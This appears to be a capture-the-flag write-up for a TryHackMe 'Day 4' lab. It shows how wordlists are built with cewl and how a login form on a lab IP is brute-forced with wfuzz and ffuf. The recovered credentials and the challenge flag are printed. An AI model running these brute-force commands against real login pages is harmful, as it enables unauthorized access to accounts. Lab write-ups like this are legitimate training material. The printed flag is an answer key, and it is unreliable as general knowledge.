
# [Day 4] Brute-forcing Baby, it's CeWLd outside

http://10.10.227.87/login.php
http://10.10.227.87/team.php


## Solucion

```
cewl -d 2 -m 5 -w passwords http://10.10.227.87/ --with-numbers
cewl -d 0 -m 5 -w usernames.txt http://10.10.227.87/team.php --lowercase
 
```

```
wfuzz -c -z file,usernames.txt -z file,passwords.txt --hs "Please enter the correct credentials" -u http://10.10.227.87/login.php -d "username=FUZZ&password=FUZ2Z"
 
isaias:Happiness

```

```

Message Content:

Hi Isaias, here's your flag THM{m3rrY4nt4rct1crAft$}

```

## Otra forma de solucionar

```
┌──(kali㉿kali)-[~/tryhackme]
└─$ cat request.txt 
POST /login.php HTTP/1.1
Host: 10.10.254.55
User-Agent: Mozilla/5.0 (X11; Linux aarch64; rv:109.0) Gecko/20100101 Firefox/115.0
Accept: text/html,application/xhtml+xml,application/xml;q=0.9,image/avif,image/webp,*/*;q=0.8
Accept-Language: en-US,en;q=0.5
Accept-Encoding: gzip, deflate, br
Content-Type: application/x-www-form-urlencoded
Content-Length: 29
Origin: http://10.10.254.55
Connection: close
Referer: http://10.10.254.55/login.php
Cookie: PHPSESSID=btreb9f7ioglb8j97f7qads898
Upgrade-Insecure-Requests: 1

username=USERFUZZ&password=PASSFUZZ
                                                                                                                                     
┌──(kali㉿kali)-[~/tryhackme]
└─$ 

```

```
──(kali㉿kali)-[~/tryhackme]
└─$ ffuf -request request.txt -request-proto http -mode clusterbomb -w usernames.txt:USERFUZZ -w passwords.txt:PASSFUZZ -fs 4478   

        /'___\  /'___\           /'___\       
       /\ \__/ /\ \__/  __  __  /\ \__/       
       \ \ ,__\\ \ ,__\/\ \/\ \ \ \ ,__\      
        \ \ \_/ \ \ \_/\ \ \_\ \ \ \ \_/      
         \ \_\   \ \_\  \ \____/  \ \_\       
          \/_/    \/_/   \/___/    \/_/       

       v2.1.0-dev
________________________________________________

 :: Method           : POST
 :: URL              : http://10.10.254.55/login.php
 :: Wordlist         : USERFUZZ: /home/kali/tryhackme/usernames.txt
 :: Wordlist         : PASSFUZZ: /home/kali/tryhackme/passwords.txt
 :: Header           : Host: 10.10.254.55
 :: Header           : Accept: text/html,application/xhtml+xml,application/xml;q=0.9,image/avif,image/webp,*/*;q=0.8
 :: Header           : Origin: http://10.10.254.55
 :: Header           : Referer: http://10.10.254.55/login.php
 :: Header           : Upgrade-Insecure-Requests: 1
 :: Header           : User-Agent: Mozilla/5.0 (X11; Linux aarch64; rv:109.0) Gecko/20100101 Firefox/115.0
 :: Header           : Accept-Language: en-US,en;q=0.5
 :: Header           : Accept-Encoding: gzip, deflate, br
 :: Header           : Content-Type: application/x-www-form-urlencoded
 :: Header           : Connection: close
 :: Header           : Cookie: PHPSESSID=btreb9f7ioglb8j97f7qads898
 :: Data             : username=USERFUZZ&password=PASSFUZZ
 :: Follow redirects : false
 :: Calibration      : false
 :: Timeout          : 10
 :: Threads          : 40
 :: Matcher          : Response status: 200-299,301,302,307,401,403,405,500
 :: Filter           : Response size: 4478
________________________________________________

[Status: 302, Size: 4442, Words: 1241, Lines: 119, Duration: 208ms]
    * PASSFUZZ: Happiness
    * USERFUZZ: isaias

:: Progress: [506/506] :: Job [1/1] :: 80 req/sec :: Duration: [0:00:07] :: Errors: 0 ::
                                                                                                                                     
┌──(kali㉿kali)-[~/tryhackme]

```


## Referencias

https://notes.benheater.com/books/web/page/use-ffuf-to-brute-force-login






